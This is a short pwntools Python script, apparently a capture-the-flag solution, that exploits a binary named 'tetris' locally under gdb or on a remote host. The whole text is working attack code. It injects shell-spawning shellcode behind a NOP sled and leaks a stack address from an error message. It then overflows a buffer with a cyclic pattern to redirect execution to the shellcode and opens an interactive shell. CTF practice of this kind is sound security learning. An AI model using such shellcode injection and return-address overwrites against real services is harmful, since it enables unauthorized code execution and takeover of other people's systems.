from pwn import *

context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 4004)
    # p = process('./tetris')
else:
    # p fget pws *loop+179
    context.terminal = ['tmux', 'splitw', '-h', '-p', '75']
    p = gdb.debug('./tetris',
                  gdbscript='''
                  b *loop+179
                  b *set_name+98
                  c
                  ''')

# inject shellcode
shellcode = asm(shellcraft.sh())
print('len(shellcode):', len(shellcode))
padding = b'\x90' * ((0x53) - len(shellcode))
p.sendlineafter(b'$ ', b'p\n' + padding +shellcode)

# leak the stack addr
p.recvuntil(b'Error occurred while printing flag at offset ').decode('utf-8').strip()
rdn_addr_str = p.recvline().strip(b'\n')
print('stack_addr', rdn_addr_str)  # 7th from rsp or rbp addr
stack_addr = int(rdn_addr_str, 16) + 16

# bufferfly
padding = cyclic(56, alphabet=string.ascii_uppercase, n=8).encode()
p.sendlineafter(b'$ ', b's\n' + padding + p64(stack_addr))

p.interactive()
